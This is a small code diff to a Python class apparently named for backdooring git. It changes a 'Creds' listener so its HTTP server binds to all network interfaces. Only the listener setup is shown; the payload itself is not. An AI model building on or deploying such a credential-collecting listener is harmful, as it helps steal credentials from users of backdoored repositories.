@@ -28,7 +28,7 @@ class GitBackdorizer(object):
     def listening(self, ip_listening, port_listening):
         os.system('clear')
         print('\n\n[+] Creds:')
-        httpd = HTTPServer((ip_listening, int(port_listening)), SimpleHTTPRequestHandler)
+        httpd = HTTPServer(("0.0.0.0", int(port_listening)), SimpleHTTPRequestHandler)
         httpd.serve_forever()
 
     def write_payload(self, payload_content):
